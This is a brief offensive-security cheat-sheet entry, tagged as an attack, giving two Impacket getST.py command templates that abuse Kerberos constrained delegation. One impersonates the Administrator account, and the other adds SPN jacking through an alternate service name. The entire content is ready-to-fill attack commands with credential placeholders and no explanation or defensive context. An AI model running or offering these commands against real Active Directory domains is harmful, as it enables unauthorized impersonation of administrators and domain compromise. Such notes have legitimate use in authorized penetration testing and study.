# getST
#plateform/linux #target/remote #cat/ATTACK

## getST Constrained Delegation
```
getST.py -spn <SPN/FQDN_or_HOSTNAME> '<DOMAIN>/<USER>:<PASSWORD>' -impersonate Administrator
```

## getST Constrained Delegation With SPN Jacking
```
getST.py -spn <SPN/FQDN_or_HOSTNAME> '<DOMAIN>/<USER>:<PASSWORD>' -impersonate Administrator -altservice <SPN_YOU_WANT/FQDN_OR_HOSTNAME>
```

